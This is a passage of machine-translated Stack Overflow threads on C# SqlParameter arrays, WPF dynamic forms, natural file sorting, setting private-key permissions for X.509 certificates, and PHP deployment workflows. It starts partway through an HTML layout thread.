        <div class="pane">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin ac ipsum id diam ullamcorper viverra. Ut nec risus. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Pellentesque pulvinar. Integer vel est. Sed elementum, tortor nec sollicitudin semper, eros purus suscipit pede, in dictum metus ligula id mauris. Donec augue metus, malesuada a, ultricies eu, volutpat quis, est. Fusce suscipit. Mauris magna. Nulla facilisi. Praesent sem odio, imperdiet ac, vestibulum quis, lacinia eget, nibh. Nunc faucibus pede nec pede. Duis eget risus. In hac habitasse platea dictumst. Cras nunc odio, tempus et, condimentum ut, lacinia quis, est. Fusce ipsum metus, accumsan a, faucibus et, semper vitae, pede. Cras est. Vivamus metus dui, lobortis at, fermentum cursus, dapibus eget, orci. Cras imperdiet. </div>
    </body>
</html>
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-08T20:15:54.727

```
<html>
    <body>
        <div style="height: 70%; border: 1px solid #000; overflow: auto;">
            <div style="background: #ddd; height: 1000px;">master</div>
        </div>
        <div style="height: 30%; border: 1px solid; #000; overflow: auto;">
            <div style="background: #ddd; height: 1000px;">detail</div>
        </div>
    </body>
</html>
```

# c# - Sql参数集合

> ID：425668
> 
> 赞同：14
> 
> 时间：2009-01-08T20:02:13.257
> 
> 标签：c#, .net, sql, parameters

我有 5 个参数，我想将它们发送到方法：

```
public static SqlCommand getCommand(string procedure, SqlParameter[] parameter)
{
   Sqlcommand cmd;
   return cmd
} 
```

我可以像这样一次发送这些参数吗？

```
SqlParameterCollection prm;
prm.Add(p1);
prm.Add(p2);
prm.Add(p3);
prm.Add(p4);
prm.Add(p5);
sqlcommand cmd = getCommand(prm); 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-01-08T20:44:46.103

或者手动创建一个参数数组：

```
SqlParameter[] parameter = {
new SqlParameter(...), 
new SqlParameter(...), 
new SqlParameter(...)
}; 
```

但我看不出你的方法有什么问题。它简单、易读且易于理解。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-08T20:05:23.593

我不明白这有什么问题？您知道吗，如果这是 .NET，您需要将参数附加到`SqlCommand`对象吗？

所以：

```
SqlCommand query = new SqlCommand(sqlString, Connection);
query.Parameters.AddWithValue(parameter,valueToPass); 
```

ETC？

抱歉，如果这不相关，对您的问题不完全确定？你的方法并没有真正做任何事情，我让你省略了代码，只是为了提出问题而放入一个假人？你可以传递一个数组作为参数，所以你只需要把它溢出？

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-12-03T03:44:40.853

以此为灵感，这段代码对我有用[：](https://stackoverflow.com/questions/13062162/how-to-use-sqlceparametercollection/13062381#13062381)

```
List<SqlCeParameter> parameters = new List<SqlCeParameter>();

parameters.Add(new SqlCeParameter("@Username", NewUsername));
parameters.Add(new SqlCeParameter("@Password", Password));

cmd.Parameters.AddRange(parameters.ToArray()); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-08T20:06:31.703

好吧，这不会编译，因为在您对 getCommand 的调用中，您没有在过程中传递一个字符串，但就数组而言，这应该没有问题。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-04-29T12:04:51.300

这是我的代码。您可以使用所有参数属性，如名称、值、类型等。

```
int SelectedListID = 6;
string selectedPrefix = "IP";
string sqlQuery = "select * from callHistory where ImportID=@IMPORTID and Prefix=@PREFIX"

SqlParameter[] sParams = new SqlParameter[2]; // Parameter count

sParams[0] = new SqlParameter();
sParams[0].SqlDbType = SqlDbType.Int;
sParams[0].ParameterName = "@IMPORTID";
sParams[0].Value = SelectedListID;

sParams[1] = new SqlParameter();
sParams[1].SqlDbType = SqlDbType.VarChar;
sParams[1].ParameterName = "@PREFIX";
sParams[1].Value = selectedPrefix;

SqlCommand cmd = new SqlCommand(sqlQuery, sConnection);

if (sParams != null)
{
    foreach (SqlParameter sParam in sParams)
    {
        cmd.Parameters.Add(sParam);
        Application.DoEvents();
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-03-19T01:33:10.053

## Form1.cs

```
 static private void FunctionCall()
    {

        string connectionString = "DATA Source=nwind;server=GRAPHICS\SQLEXPRESS;Persist Security Info=False;Integrated Security=SSPI;Connect Timeout=30";
        string sSqlQuery;

        DataSet ds;
        DataTable dt;

        // Prepare SQL Query
        sSqlQuery = @"
        select content " +
        "from " +
        "[TBL] where id = '000-000'";

        SqlParameter[] sqlParams = {
                new SqlParameter("",SqlDbType.Int), 
                new SqlParameter("",SqlDbType.VarChar), 
                new SqlParameter("",SqlDbType.VarChar)
        };

        // Read from database
        ds = SqlHelper.ExecuteNonQuery(connectionString, sSqlQuery, CommandType.Text, sqlParams);
        dt = ds.Tables[0];
     } 
```

## SqlHelper.cs

// 执行非查询

```
public static int ExecuteNonQuery (string connectionString, string cmdText, CommandType type, SqlParameter[] prms)
        {
            using (SqlConnection conn = new SqlConnection(connectionString))
            {
                using (SqlCommand cmd = new SqlCommand(cmdText, conn))
                {
                    cmd.CommandType = type;

                if (prms != null)
                {
                    foreach (SqlParameter p in prms)
                    {
                        cmd.Parameters.Add(p);
                    }
                }
                conn.Open();
                return cmd.ExecuteNonQuery();
            }
        }
    } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-12-29T07:15:41.720

1.

```
public IEnumerable<SqlParameter> GetAndSetParameters(List<Tuple<string, string>> parameters){
            List<SqlParameter> paramlist = new List<SqlParameter>();

            foreach (var item in parameters)
        {
            paramlist.Add(new SqlParameter(item.Item1, item.Item2));
        }
        return paramlist;
    } 
```

2.传递参数

```
 public List<Tuple<string, string>> GetUserParameter(){
        List<Tuple<string, string>> list = new List<Tuple<string, string>>();
                list.Add(new Tuple<string, string>("@User",user.UserID));
                   return list;
        } 
```

3.最后使用它：

```
 SqlCommand oCmd = new SqlCommand(oString, myConnection);
                oCmd.Parameters.AddRange(GetAndSetParameters(GetUserParameter()).ToArray()); 
```

# c# - WPF 中是否有 C# 的 MVC 模式

> ID：425680
> 
> 赞同：2
> 
> 时间：2009-01-08T20:05:42.750
> 
> 标签：c#, xml, user-interface, design-patterns, project-planning

在 WPF 中是否有一种模式，我可以从数据库中提取的类似 XML 的定义文件构建一个简单的 UI 表单？

它将允许用户在此表单中输入数据，然后将其提交回来。数据将以 XML 结构发回，该结构将紧密/精确地模仿 UI 定义。

定义应包括数据类型，以及它是否是必需的值。然后我想将这些数据类型和所需的值映射到数据验证规则，因此除非通过检查，否则无法提交表单。

它还应该处理拥有重复数据列表的能力。

我正处于这个项目的规划阶段，并且在这一点上在设计上有相当好的灵活性，虽然我很确定我需要坚持桌面，而不是网络，因为我可能也在做一些 Office 互操作的东西。

你会推荐什么技术栈？我认为 XMAL 和 WPF 可能接近答案。

我也看过[XUL](http://www.mozilla.org/projects/xul)，但它似乎还没有准备好或对 C# 有用。（ 2002 年从 MSDN找到这篇[文章）](http://msdn.microsoft.com/en-us/magazine/cc188912.aspx)

谢谢你，
基思

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T22:41:17.587

Model View Presenter 似乎非常适合 WPF，如果您在查看[Supervisor Controller](http://martinfowler.com/eaaDev/SupervisingPresenter.html)模式之前没有听说过它，它是 MVP 的一个子集（作者已将其重命名为[Supervisor Controller](http://martinfowler.com/eaaDev/SupervisingPresenter.html)和[Passive View](http://martinfowler.com/eaaDev/PassiveScreen.html)作为两种不同风格的 MVP ）。它是一种设计原则，可以帮助您促进关注点分离，并且当您没有框架来物理强制执行它时，它比 MVC 工作得更好。

您总是可以尝试为 ASP.NET MVC 创建一个与 WPF 一起使用的视图引擎，这很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T20:10:03.383

好吧，如果你想自己滚动一些东西，你可以很容易地加载和呈现动态 XAML。与其让用户直接创建 XAML，不如将它的一个子集“映射”到您选择的 XML 格式，然后通过 XSL 转换为有效的 XAML：

```
XmlReader tXml = XmlReader.Create(myXamlString);
UIElement MyElement = (UIElement)XamlReader.Load(tXml); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T20:11:20.227

[卡利本](http://devlicio.us/blogs/rob_eisenberg/archive/2008/01/07/introducing-caliburn-an-mvc-mvp-wpf-framework.aspx)呢？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T20:14:17.913

您可能需要考虑查看 CSLA.NET 框架。你可以在这里阅读它以及一本写得很好的可用书籍的信息：

[http://www.lhotka.net/Default.aspx](http://www.lhotka.net/Default.aspx)

-埃里克

# c# - IComparer 问题 + 如何在 .NET 中自然地对字符串数组（FILE_10 > FILE_2）进行排序？

> ID：425685
> 
> 赞同：0
> 
> 时间：2009-01-08T20:07:03.030
> 
> 标签：c#, arrays, sorting, icomparer, natural-sort

在我的帖子底部解决。

或者更具体地说：

我有一堆 FileInfo 对象（我需要 FileInfo 对象来排除隐藏、系统和重新分析点文件）。

我需要根据 FileInfo.FullName 自然地对 FileInfo[] 进行排序。所以 FILE_10.ext 应该在 FILE_2.ext 之后。幸运的是 FileInfo[] 只包含一个扩展名的文件。

我已经实现了一个比较器：

```
/// <summary>
/// Compares FileInfo objects based on the files full path.
/// This comparer is flawed in that it will only work correctly
/// on files with the same extension.
/// Though that could easily be fixed.
/// </summary>
private class FileInfoSorter : IComparer
{

    int IComparer.Compare(Object x, Object y)
    {
        FileInfo _x = x as FileInfo;
        FileInfo _y = y as FileInfo;

        // FYI: 
        //ExprFileVersion = new Regex("(.*)_([0-9]+)\\.[^\\.]+$", RegexOptions.Compiled);
        Match m1 = RegExps.ExprFileVersion.Match(_x.FullName);
        Match m2 = RegExps.ExprFileVersion.Match(_y.FullName);
        if (m1.Success && m2.Success) // we have versioned files
        {
            int n1;
            int n2;
            try
            {
                n1 = int.Parse(m1.Groups[2].Value);
            }
            catch (OverflowException ex)
            {
                // Don't know if this works.
                ex.Data["File"] = _x.FullName;
                throw;
            }

            try
            {
                n2 = int.Parse(m2.Groups[2].Value);
            }
            catch (OverflowException ex)
            {
                // Don't know if this works.
                ex.Data["File"] = _y.FullName;
                throw;
            }

            string s1 = m1.Groups[1].Value;
            string s2 = m2.Groups[1].Value;

            if (s1.Equals(s2))
            {
                return n1.CompareTo(n2); // compare numbers naturally. E.g. 11 > 6                        
            }
            else // not the same base file name. So the version does not matter.
            {
                return ((new CaseInsensitiveComparer()).Compare(_x.FullName, _y.FullName));
            }
        }
        else // not versioned
        {
            return ((new CaseInsensitiveComparer()).Compare(_x.FullName, _y.FullName));
        }
    }

} 
```

现在问题出现了，int.Parse 抛出了一个溢出异常，我无法在正确的位置捕获它（由于某种原因，它再次出现在 return 语句的行上，我无法在更上一层智能地处理它，因为它永远不会到达那里）。

问题是：这种事情是否有预先实现的比较器？异常出现在有趣的地方的原因可能是什么？

调用代码：

```
 IComparer fiComparer = new FileInfoSorter();

        try
        {
            Array.Sort(filesOfExtInfo, fiComparer);
        }
        catch (OverflowException ex)
        {
            // Do not know yet if I can use ex.Data in this way.
            WriteStatusLineAsync("Error: Encountered too large a version number on file: " + ex.Data["File"]);
        } 
```

EDIT1： Int.Parse 在遇到太大的数字时抛出 OverflowException。它不应该经常发生，但我希望它被覆盖。

EDIT2：我最终调整了自己的比较器。离开了 int.Parse 并且只是用零填充以进行比较。代码在这里：

```
 public class FileInfoSorter : IComparer
    {

        int IComparer.Compare(Object x, Object y)
        {
            FileInfo _x = x as FileInfo;
            FileInfo _y = y as FileInfo;

            Match m1 = RegExps.ExprFileVersion.Match(_x.FullName);
            Match m2 = RegExps.ExprFileVersion.Match(_y.FullName);
            if (m1.Success && m2.Success) // we have versioned files
            {

                string n1;
                string n2;
                n1 = m1.Groups[2].Value;
                n2 = m2.Groups[2].Value;

                string s1 = m1.Groups[1].Value;
                string s2 = m2.Groups[1].Value;

                int max = Math.Max(n1.Length, n2.Length);

                n1 = n1.PadLeft(max, '0');
                n2 = n2.PadLeft(max, '0');

                if (s1.Equals(s2)) // we have to compare the version
                    // which is now left-padded with 0s.
                {
                    return ((new CaseInsensitiveComparer()).Compare(n1, n2)); 
                }
                else // not the same base file name. So the version does not matter.
                {
                    return ((new CaseInsensitiveComparer()).Compare(_x.FullName, _y.FullName));
                }
            }
            else // not versioned
            {
                return ((new CaseInsensitiveComparer()).Compare(_x.FullName, _y.FullName));
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-08T20:29:28.727

就在这里。这个问题已经在[这里](https://stackoverflow.com/questions/248603/natural-sort-order-in-c)回答了。您基本上想通过 P/Invoke 层调用[StrCmpLogicalW函数。](http://msdn.microsoft.com/en-us/library/bb759947(VS.85).aspx)有关详细信息，请参阅原始答案：

[C#中的自然排序顺序](https://stackoverflow.com/questions/248603/natural-sort-order-in-c)

# c# - 如何从 .NET 对 X.509 证书的私钥文件设置读取权限

> ID：425688
> 
> 赞同：32
> 
> 时间：2009-01-08T20:07:29.347
> 
> 标签：c#, .net, ssl, ssl-certificate

这是将 pfx 添加到 Cert 存储的代码。

```
X509Store store = new X509Store( StoreName.My, StoreLocation.LocalMachine );
store.Open( OpenFlags.ReadWrite );
X509Certificate2 cert = new X509Certificate2( "test.pfx", "password" );
store.Add( cert );
store.Close(); 
```

但是，我找不到设置 NetworkService 访问私钥的权限的方法。

任何人都可以解释一下吗？提前致谢。

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2011-02-04T19:17:53.887

这个答案很晚，但我想将它发布给其他在这里搜索的人：

我在这里找到了一篇 MSDN 博客文章，该文章给出了使用 CryptoKeySecurity 的解决方案，[这里](http://blogs.msdn.com/b/cagatay/archive/2009/02/08/removing-acls-from-csp-key-containers.aspx)是 C# 中的解决方案示例：

```
var rsa = certificate.PrivateKey as RSACryptoServiceProvider;
if (rsa != null)
{
    // Modifying the CryptoKeySecurity of a new CspParameters and then instantiating
    // a new RSACryptoServiceProvider seems to be the trick to persist the access rule.
    // cf. http://blogs.msdn.com/b/cagatay/archive/2009/02/08/removing-acls-from-csp-key-containers.aspx
    var cspParams = new CspParameters(rsa.CspKeyContainerInfo.ProviderType, rsa.CspKeyContainerInfo.ProviderName, rsa.CspKeyContainerInfo.KeyContainerName)
    {
        Flags = CspProviderFlags.UseExistingKey | CspProviderFlags.UseMachineKeyStore,
        CryptoKeySecurity = rsa.CspKeyContainerInfo.CryptoKeySecurity
    };

    cspParams.CryptoKeySecurity.AddAccessRule(new CryptoKeyAccessRule(sid, CryptoKeyRights.GenericRead, AccessControlType.Allow));

    using (var rsa2 = new RSACryptoServiceProvider(cspParams))
    {
        // Only created to persist the rule change in the CryptoKeySecurity
    }
} 
```

我正在使用 SecurityIdentifier 来识别帐户，但 NTAccount 也可以。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2015-07-02T03:29:03.883

万一这对其他人有帮助，我在 Powershell 中写下了 Jim Flood 的答案

```
function Set-PrivateKeyPermissions {
param(
[Parameter(Mandatory=$true)][string]$thumbprint,
[Parameter(Mandatory=$false)][string]$account = "NT AUTHORITY\NETWORK SERVICE"
)
#Open Certificate store and locate certificate based on provided thumbprint
$store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
$store.Open("ReadWrite")
$cert = $store.Certificates | where {$_.Thumbprint -eq $thumbprint}

#Create new CSP object based on existing certificate provider and key name
$csp = New-Object System.Security.Cryptography.CspParameters($cert.PrivateKey.CspKeyContainerInfo.ProviderType, $cert.PrivateKey.CspKeyContainerInfo.ProviderName, $cert.PrivateKey.CspKeyContainerInfo.KeyContainerName)

# Set flags and key security based on existing cert
$csp.Flags = "UseExistingKey","UseMachineKeyStore"
$csp.CryptoKeySecurity = $cert.PrivateKey.CspKeyContainerInfo.CryptoKeySecurity
$csp.KeyNumber = $cert.PrivateKey.CspKeyContainerInfo.KeyNumber

# Create new access rule - could use parameters for permissions, but I only needed GenericRead
$access = New-Object System.Security.AccessControl.CryptoKeyAccessRule($account,"GenericRead","Allow")
# Add access rule to CSP object
$csp.CryptoKeySecurity.AddAccessRule($access)

#Create new CryptoServiceProvider object which updates Key with CSP information created/modified above
$rsa2 = New-Object System.Security.Cryptography.RSACryptoServiceProvider($csp)

#Close certificate store
$store.Close()

} 
```

请注意，帐户参数也可以采用“DOMAIN\USER”的形式（不仅仅是内置名称） - 我在我的环境中对此进行了测试，它会自动将其转换为适当的 SID

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2009-01-08T22:11:11.280

要以编程方式执行此操作，您必须做三件事：

1.  获取私钥文件夹的路径。

2.  获取该文件夹中私钥的文件名。

3.  将权限添加到该文件。

请参阅[这篇文章](http://www.codeproject.com/script/Forums/View.aspx?fid=1649&msg=2062983)，了解所有这三个方面的一些示例代码（特别是查看“AddAccessToCertificate”方法）。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2009-01-08T21:56:54.087

您可以使用作为[Windows Server 2003 资源工具包工具的一部分提供的](http://www.microsoft.com/downloads/details.aspx?familyid=9d467a69-57ff-4ae7-96ee-b18c4790cffd&displaylang=en)[WinHttpCertCfg.exe](http://msdn.microsoft.com/en-us/library/aa384088.aspx)工具。

例子：

```
winhttpcertcfg -g -c LOCAL_MACHINE\My -s test -a NetworkService 
```

或者，您可以使用 WCF SDK 附带的[Find Private Key 工具](http://msdn.microsoft.com/en-us/library/ms732026.aspx)来查找证书私钥文件在磁盘上的位置。然后，您可以简单地使用 ACL 为文件设置正确的权限。

例子：

```
FindPrivateKey My LocalMachine -n "CN=test" 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2019-10-30T23:59:04.497

根据@russ 的回答，

此版本同时适用于 Key Storage Provider 和 Legacy Crypto Service Provider。

```
function Set-PrivateKeyPermissions {
    param(
        [Parameter(Mandatory=$true)]
        [string]$thumbprint,
        [Parameter(Mandatory=$true)]
        [string]$account
    )

    #Open Certificate store and locate certificate based on provided thumbprint
    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
    $store.Open("ReadWrite")
    $cert = $store.Certificates | where {$_.Thumbprint -eq $thumbprint}

    if ($cert.PrivateKey -Eq $null) {
        # Probably using Key Storage Provider rather than crypto service provider
        $rsaCert = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPrivateKey($cert)
        if ($rsaCert -Eq $null) {
            throw "Private key on certificate $($cert.Subject) not available"
        }

        $fileName = $rsaCert.key.UniqueName
        $path = "$env:ALLUSERSPROFILE\Microsoft\Crypto\Keys\$fileName"
        $permissions = Get-Acl -Path $path

        $access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule($account, "FullControl", "Allow")
        $permissions.AddAccessRule($access_rule)
        Set-Acl -Path $path -AclObject $permissions
    } else {
        #Create new CSP object based on existing certificate provider and key name
        $csp = New-Object System.Security.Cryptography.CspParameters($cert.PrivateKey.CspKeyContainerInfo.ProviderType, $cert.PrivateKey.CspKeyContainerInfo.ProviderName, $cert.PrivateKey.CspKeyContainerInfo.KeyContainerName)

        # Set flags and key security based on existing cert
        $csp.Flags = "UseExistingKey","UseMachineKeyStore"
        $csp.CryptoKeySecurity = $cert.PrivateKey.CspKeyContainerInfo.CryptoKeySecurity
        $csp.KeyNumber = $cert.PrivateKey.CspKeyContainerInfo.KeyNumber

        # Create new access rule - could use parameters for permissions, but I only needed GenericRead
        $access = New-Object System.Security.AccessControl.CryptoKeyAccessRule($account,"GenericRead","Allow")
        # Add access rule to CSP object
        $csp.CryptoKeySecurity.AddAccessRule($access)

        #Create new CryptoServiceProvider object which updates Key with CSP information created/modified above
        $rsa2 = New-Object System.Security.Cryptography.RSACryptoServiceProvider($csp)
    }

    #Close certificate store
    $store.Close()
} 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-10-03T04:14:34.820

如果有人感兴趣，这是我为 Windows Server 2008 找到的解决方案：[http ://technet.microsoft.com/en-us/library/ee662329.aspx](http://technet.microsoft.com/en-us/library/ee662329.aspx)

基本上，我必须向需要使用 MMC 工具访问证书的服务授予权限。奇迹般有效。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2021-11-17T23:32:54.523

如果`PrivateKey`of`Certificate`是类型`RSACng`，你可以走这条路：

对于本地机器：

```
 var rsaPrivateKey = certificate.GetRSAPrivateKey();
 var privateKey = rsaPrivateKey as RSACng;
 var keyUniqueName = privateKey.Key.UniqueName;
 var folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
 var keyPath = Path.Combine(folderPath, "Microsoft", "Crypto", "RSA", "MachineKeys", keyUniqueName);
 var fileInfo = new FileInfo(keyPath);
 var accessControl = fileInfo.GetAccessControl();
 accessControl.AddAccessRule(new FileSystemAccessRule(new NTAccount("<account>"), FileSystemRights.FullControl, AccessControlType.Allow));
 fileInfo.SetAccessControl(accessControl); 
```

如果它是用户证书，请使用`Environment.SpecialFolder.ApplicationData`并`sid`在文件夹中找到`roaming\microsoft\crypto\rsa`。

# php - 您首选的 php 部署策略是什么？

> ID：425692
> 
> 赞同：161
> 
> 时间：2009-01-08T20:09:33.210
> 
> 标签：php, deployment, capistrano

我正在开始一个 PHP 新项目，我很想从其他开发人员那里获得一些关于他们首选的 PHP 部署策略的反馈。我很想将事情自动化一点，以便一旦提交更改，它们就可以快速迁移到开发或生产服务器。

我有使用 Capistrano 和 Ruby 以及一些基本的 shell 脚本进行部署的经验。

在我自己动手之前，很高兴听到其他人在他们的项目中是如何处理这个问题的。

## 更多的信息

目前，开发人员在站点的本地安装上工作，并将更改提交到 subversion 存储库。初始部署是通过从 svn 导出标记的版本并将其上传到服务器来进行的。

其他更改通常是通过手动上传更改的文件来零碎进行的。

* * *

## 回答 #1

> 赞同：109
> 
> 时间：2009-01-08T20:20:05.203

对于 PHP，带有[Phing](http://phing.info/)构建脚本的 SVN 是要走的路。Phing 类似于[ANT](http://ant.apache.org/)，但它是用 PHP 编写的，这使得 PHP 开发人员更容易根据自己的需要进行修改。

我们的部署例程如下：

*   每个人在工作中都在同一个本地服务器上开发，每个开发人员在他家的机器上也有一个结帐。
*   提交触发了一个更新登台服务器的提交后挂钩。
*   测试在登台服务器上运行，如果它们通过 - 继续。
*   运行 Phing 构建脚本：
*   关闭生产服务器，将域切换到“建设中”页面
*   在生产结账时运行 SVN 更新
*   运行架构增量脚本
*   运行测试
*   如果测试失败 - 运行回滚脚本
*   如果测试通过，服务器路由回生产结账

还有[phpUnderControl](http://www.phpundercontrol.org/about.html)，它是一个持续集成服务器。老实说，我没有发现它对 Web 项目很有用。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2009-01-09T02:48:55.870

我目前正在[使用 Git](https://stackoverflow.com/questions/279169/deploy-php-using-git#327315)部署 PHP 。只需一个简单的 git push 生产就可以使用 Git 的最新副本更新我的生产服务器。它既简单又快速，因为 Git 足够聪明，可以只发送差异，而不是重新发送整个项目。它还有助于在 Web 服务器上保留存储库的冗余副本，以防万一我端出现硬件故障（尽管为了安全起见，我也推送到 GitHub）。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2009-04-07T10:30:43.117

我们使用[Webistrano](https://github.com/peritor/webistrano)，一个 Capistrano 的 Web 前端，并且对它非常满意。

Webistrano 允许从 SVN、GIT 等进行多阶段、多环境部署。它具有内置的回滚支持，支持单独的服务器角色，例如 web、db、app 等，并且可以并行部署。它允许您在多个级别（例如每个阶段）覆盖配置参数，并记录每次部署的结果，可选择邮寄。

尽管 Capistrano 和 Webistrano 是 Ruby 应用程序，但部署“配方”的语法简单而强大，足以让任何 PHP 程序员理解。Capistrano 最初是为 Ruby on Rails 项目构建的，但很容易适应 PHP 项目。

配置完成后，非程序员甚至可以很容易地使用它，例如部署临时版本的测试人员。

为了提供最快的部署，我们安装了[fast_remote_cache](http://github.com/37signals/fast_remote_cache/tree/master)方法，它更新远程服务器上的 svn 工作副本缓存，然后硬链接结果。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2009-01-08T20:24:19.547

我使用[Apache Ant](http://ant.apache.org/)部署到不同的目标（开发、QA 和实时）。Ant 设计用于 Java 部署，但它为部署任意文件提供了一个非常有用的通用案例解决方案。

build.xml 文件的语法很容易学习 - 您定义不同的目标及其依赖项，当您在命令行上调用 ant 程序时，它们会运行。

例如，我有 dev、QA 和 live 的目标，每个目标都依赖于 cvsbuild 目标，该目标从我们的 CVS 服务器检查最新的头版本，将适当的文件复制到构建目录（使用文件集标记），然后rsync 将构建目录同步到适当的服务器。有一些怪癖要学习，而且学习曲线并不完全平坦，但我多年来一直这样做没有问题，所以我会根据你的情况推荐它，虽然我很好奇我还有什么其他答案会在这个线程上看到。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2009-01-09T01:56:39.750

我使用 Git 手动做一些事情。一个用于开发的存储库，它被`git push --mirror`编入公共存储库，实时服务器是从中提取的第三个存储库。我想这部分与您自己的设置相同。

最大的不同是我几乎在我正在处理的每一个更改中都使用分支（我现在大约有 5 个），并且倾向于在它们之间来回切换。除了合并其他分支外，主分支不会直接更改。

我直接从主分支运行实时服务器，当我完成另一个分支并准备合并它时，将服务器翻转到该分支一段时间。如果它坏了，把它放回主人需要几秒钟。如果它有效，它将被合并到 master 并更新实时代码。我想 SVN 中的一个类比是有两个工作副本并通过符号链接指向实时副本。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-01-09T02:21:05.363

我知道[Phing](http://phing.info/trac/)已经被提到过几次了，但是我对[phpUnderControl](http://www.phpundercontrol.org/about.html)非常幸运。对我们来说我们

1.  将分支的各个副本检出到本地计算机
2.  分支经过测试，然后合并到主干
3.  对 Trunk 的提交由 phpUnderControl 自动构建，运行测试并构建所有文档，应用数据库增量
4.  主干通过质量测试，然后合并到我们的稳定分支
5.  同样，phpUnderControl 会自动构建 Stable、运行测试、生成文档并更新数据库
6.  当我们准备好推送到生产环境时，我们运行一个 rsync 脚本来备份生产环境，更新数据库，然后推送文件。rsync 命令是手动调用的，以便我们确保有人正在观看促销活动。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2012-08-03T22:41:12.940

自制部署脚本的替代方案是部署到平台即服务，它为您抽象出很多工作。PaaS 通常会提供自己的代码部署工具，以及可扩展性、容错性（例如，当硬件出现故障时不会停机），并且通常是用于监控、日志检查等的出色工具包。部署到已知的良好配置将随着时间的推移保持最新（让您少一个头痛）。

我推荐的 PaaS 是[dotCloud](http://www.dotcloud.com)，除了 PHP（[参见他们的 PHP 快速入门](http://docs.dotcloud.com/tutorials/php/quickstart/)）之外，它还可以部署 MySQL、MongoDB 和一大堆附加服务。它还具有不错的优点，例如零停机部署、即时回滚、对 SSL 和 websocket 的完全支持等。还有一个免费层，总是很好:)

当然，因为我在那里工作，所以我有点偏见！除了 dotCloud 之外，其他值得一试的选项是 Pagodabox 和 Orchestra（现在是 Engine Yard 的一部分）。

希望这可以帮助！

所罗门

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2009-01-08T20:15:31.750

您自动且盲目地从存储库更改到生产服务器听起来很危险。如果您提交的代码包含回归错误，因此您的生产应用程序出现故障怎么办？

但是，如果你想要一个 PHP 的持续集成系统，我猜[Phing](http://phing.info/trac/)是 PHP 的最佳选择。不过，我自己还没有测试过，因为我以手动方式填充，例如 scp。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2012-02-17T15:04:54.483

我迟到了，但我想我会分享我们的方法。我们将 Phing 与[Phingistrano](https://github.com/CodeMeme/Phingistrano)一起使用，它通过预构建的构建文件为 Phing 提供类似 Capistrano 的功能。它非常酷，但仅在您目前使用 Git 时才有效。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-01-09T00:46:00.890

我在服务器上有一个 SVN 发布分支的工作副本。更新站点（当没有架构更改时）就像发出 SVN 更新命令一样简单。我什至不必让网站离线。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-01-09T21:28:31.330

如果您能忍受 xml 配置文件的痛苦，那么 Phing 可能是您最好的选择。Symfony 框架有它自己的 rake (pake) 端口，它工作得很好，但与 Symfony 的其余部分耦合得相当紧密（尽管你可以将它们分开）。

另一种选择是使用 Capistrano。显然，它与 PHP 的集成不如与 Ruby 的集成好，但您仍然可以将它用于很多东西。

最后，您始终可以编写 shell 脚本。到目前为止，这就是我所做的。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2010-07-08T07:23:49.543

[http://controltier.org/wiki/Main_Page](http://controltier.org/wiki/Main_Page)

我们将使用它进行多服务器部署和维护。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2010-09-23T19:06:31.063

晚了一年，但是……就我而言，部署不是自动的。我发现自动部署代码和运行数据库迁移脚本很危险。

相反，颠覆挂钩仅用于部署到测试/登台服务器。在运行测试并确保一切正常之后，代码在迭代结束时部署到生产环境。对于部署本身，我使用了一个定制的 Makefile，它使用 rsync 来传输文件。Makefile 还可以在远程服务器上运行迁移脚本，暂停/恢复 Web 和数据库服务器。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2011-02-17T05:13:23.457

在我的工作中，我自己和我的团队已经为 capistrano 的部署开发了一个面向 Phing 的替代品，我们还整合了 phing 中可用的一些好东西，例如 PHPUnit 测试、phpcs 和 PHPDocumentor。我们已经把它做成了一个 git repo，它可以作为 git 中的子模块添加到项目中，并且效果很好。我已经将它附加到了一些项目中，并且它足够模块化，可以很容易地在我们的多个环境（暂存、测试、生产等）中的任何项目中使用它。

使用 phing 构建脚本，您可以从命令行手动运行它们，而且我还成功地使用 Hudson 和现在的 Jenkins ci 自动化构建/部署例程。

我现在不能发布任何链接，因为 repo 还没有公开，但是我被告知我们有时会很快开源它，所以如果你有兴趣或者如果你有，请随时与我联系关于使用 phing 和 git 自动化部署的任何问题。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2010-02-24T08:38:19.013

